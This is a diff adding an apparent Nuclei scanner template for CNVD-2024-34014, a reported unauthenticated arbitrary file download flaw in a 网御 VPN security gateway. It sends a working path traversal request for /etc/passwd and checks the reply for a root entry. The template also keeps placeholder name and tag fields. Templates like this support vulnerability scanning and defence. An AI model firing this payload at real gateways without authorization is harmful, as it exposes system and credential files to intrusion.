@@ -1,0 +1,20 @@
+id: CNVD-2024-34014
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 网御VPN安全网关存在任意文件下载漏洞，攻击者可利用该漏洞在未经身份验证的情况下下载passwd等敏感文件。
+  reference:
+    - https://github.com/wy876/POC/commit/3a4f16b676ac62a239914471a62c8daac33e51fc#diff-9edd5957f5be8f02e0ec1189483dc20d03f688264b4a28bda0e83006aca5c2edR3
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SSL/admin/UserFile?FileName=../../../etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
